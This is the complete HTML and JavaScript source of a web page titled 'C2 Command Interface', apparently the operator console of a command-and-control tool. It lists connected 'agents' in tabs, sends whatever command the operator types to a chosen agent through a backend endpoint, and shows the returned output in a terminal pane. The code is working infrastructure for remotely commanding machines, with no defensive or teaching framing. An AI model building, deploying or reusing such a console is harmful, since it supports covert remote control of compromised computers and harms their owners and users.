<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C2 Command Interface</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #1a1a1a;
            color: white;
        }

        .container {
            display: flex;
            flex-direction: column;
            height: 60vh;
        }

        .tabs-container {
            display: flex;
            gap: 5px;
            padding: 5px;
            background: #333;
            flex-shrink: 0;
        }

        .tab {
            padding: 5px 15px;
            background: #444;
            color: white;
            border: none;
            cursor: pointer;
            border-radius: 3px 3px 0 0;
            transition: background 0.3s;
        }

        .tab.active {
            background: #666;
        }

        .clients-container {
            flex: 1;
            position: relative;
        }

        .client-section {
            display: none;
            flex-direction: column;
            height: 100%;
        }

        .client-section.active {
            display: flex;
        }

        .terminal {
            flex: 1;
            padding: 10px;
            overflow-y: auto;
            white-space: pre-wrap;
            background-color: #000;
            color: #0f0;
            font-family: monospace;
        }

        .input-area {
            border-top: 1px solid #555;
            padding: 10px;
            display: flex;
            gap: 10px;
            background: #222;
        }

        .input-area .prompt {
            color: #0f0;
            white-space: nowrap;
            font-family: monospace;
            padding-top: 4px;
        }

        .input-area input {
            flex: 1;
            background: #111;
            border: 1px solid #333;
            color: #0f0;
            padding: 5px 10px;
            font-family: monospace;
        }

        .input-area button {
            background: #444;
            color: white;
            border: none;
            padding: 5px 15px;
            cursor: pointer;
            transition: background 0.3s;
        }

        .input-area button:hover {
            background: #555;
        }

        .notification-bar {
            position: fixed;
            top: 0;
            right: -100%;
            background-color: #333;
            color: white;
            padding: 10px;
            font-family: Arial, sans-serif;
            transition: right 0.5s ease;
            display: none;
            z-index: 1000;
            border-radius: 3px 0 0 3px;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="tabs-container" id="tabs-container"></div>
        <div class="clients-container" id="clients-container">
            <div class="no-clients"
                style="display: flex; justify-content: center; align-items: center; height: 100%; color: #666;">
                No active agents connected
            </div>
        </div>
    </div>

    <div class="notification-bar" id="notification-bar"></div>

    <script>
        let activeClientId = null;
        const liveClients = new Map(); // Stores client data by ID

        // Fetch live clients periodically
        async function fetchLiveClients() {
            try {
                const response = await fetch('/api/getLiveClients', {
                    method: 'POST'
                });
                const data = await response.json();
                updateClientList(data.live_clients);
            } catch (error) {
                console.error('Error fetching live clients:', error);
            }
        }

        // Update client list and UI
        function updateClientList(clients) {
            const newClientIds = new Set(clients.map(c => c.client_id));
            const existingClientIds = new Set(liveClients.keys());

            // Remove disconnected clients
            existingClientIds.forEach(id => {
                if (!newClientIds.has(id)) {
                    removeClient(id);
                }
            });

            // Add new clients
            clients.forEach(client => {
                if (!liveClients.has(client.client_id)) {
                    addClient(client);
                }
            });

            // Update no-clients message visibility
            document.querySelector('.no-clients').style.display =
                liveClients.size > 0 ? 'none' : 'flex';
        }

        function addClient(client) {
            liveClients.set(client.client_id, client);

            // Create tab
            const tab = document.createElement('button');
            tab.className = 'tab';
            tab.textContent = `${client.client_id}-${client.nickname}`;
            tab.dataset.clientId = client.client_id;
            tab.onclick = () => switchTab(client.client_id);
            document.getElementById('tabs-container').appendChild(tab);

            // Create client section
            const section = document.createElement('div');
            section.className = 'client-section';
            section.id = `client-${client.client_id}`;

            const terminal = document.createElement('div');
            terminal.className = 'terminal';
            terminal.dataset.clientId = client.client_id;

            const inputArea = document.createElement('div');
            inputArea.className = 'input-area';

            const prompt = document.createElement('span');
            prompt.className = 'prompt';
            prompt.textContent = `${client.user} > `;

            const input = document.createElement('input');
            input.type = 'text';
            input.placeholder = 'Type command here';
            input.addEventListener('keypress', e => {
                if (e.key === 'Enter') sendCommand(client.client_id, input);
            });

            const button = document.createElement('button');
            button.textContent = 'Send';
            button.onclick = () => sendCommand(client.client_id, input);

            inputArea.appendChild(prompt);
            inputArea.appendChild(input);
            inputArea.appendChild(button);

            section.appendChild(terminal);
            section.appendChild(inputArea);
            document.getElementById('clients-container').appendChild(section);

            // Switch to new client if first one
            if (liveClients.size === 1) {
                switchTab(client.client_id);
            }

            // Show notification bar
            showNotification(`Client added: ${client.client_id} - ${client.nickname}`, true);
        }

        function removeClient(clientId) {
            // Show notification bar
            const client = liveClients.get(clientId);
            showNotification(`Client removed: ${clientId} - ${client.nickname}`);
            // Remove tab
            const tab = document.querySelector(`.tab[data-client-id="${clientId}"]`);
            if (tab) tab.remove();

            // Remove client section
            const section = document.getElementById(`client-${clientId}`);
            if (section) section.remove();

            liveClients.delete(clientId);

            // If active client was removed, switch to first available
            if (activeClientId === clientId) {
                const firstClient = liveClients.keys().next().value;
                if (firstClient) {
                    switchTab(firstClient);
                } else {
                    activeClientId = null;
                }
            }


        }

        function switchTab(clientId) {
            // Update tabs
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.toggle('active', tab.dataset.clientId === clientId);
            });

            // Update client sections
            document.querySelectorAll('.client-section').forEach(section => {
                section.classList.toggle('active', section.id === `client-${clientId}`);
            });

            activeClientId = clientId;
        }

        function sendCommand(clientId, inputElement) {
            const command = inputElement.value.trim();
            if (!command) return;

            // Add command to terminal
            const terminal = document.querySelector(`.terminal[data-client-id="${clientId}"]`);
            terminal.textContent += `${liveClients.get(clientId).user} > ${command}\n`;
            terminal.scrollTop = terminal.scrollHeight;

            // Send command to server with correct JSON format
            fetch('/input-command-to-execute-from-web', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    clientid: clientId,  // Correct key for client ID
                    command: command     // Correct key for command
                })
            });

            inputElement.value = '';
        }

        // Show notification bar with a message
        function showNotification(message, isConnected) {
            const notificationBar = document.getElementById('notification-bar');

            // Set the color based on connection status
            if (isConnected) {
                notificationBar.style.backgroundColor = 'green'; // For connected clients
            } else {
                notificationBar.style.backgroundColor = 'red';   // For disconnected clients
            }

            notificationBar.textContent = message;
            notificationBar.style.display = 'block';
            notificationBar.style.right = '0';

            setTimeout(() => {
                notificationBar.style.right = '-100%';
                setTimeout(() => {
                    notificationBar.style.display = 'none';
                }, 500);
            }, 3000);
        }


        // Fetch command results periodically
        async function fetchResults() {
            try {
                const response = await fetch('/execution-result-to-show-in-web');
                const data = await response.json();

                // Loop through the dictionary where client_id is the key and result is the value
                for (const [client_id, result] of Object.entries(data)) {
                    const terminal = document.querySelector(`.terminal[data-client-id="${client_id}"]`);
                    if (terminal) {
                        terminal.textContent += result + '\n';
                        terminal.scrollTop = terminal.scrollHeight;
                    }
                }
            } catch (error) {
                console.error('Error fetching results:', error);
            }
        }


        // Initial setup
        setInterval(fetchLiveClients, 3000);
        setInterval(fetchResults, 1000);
    </script>
</body>

</html>
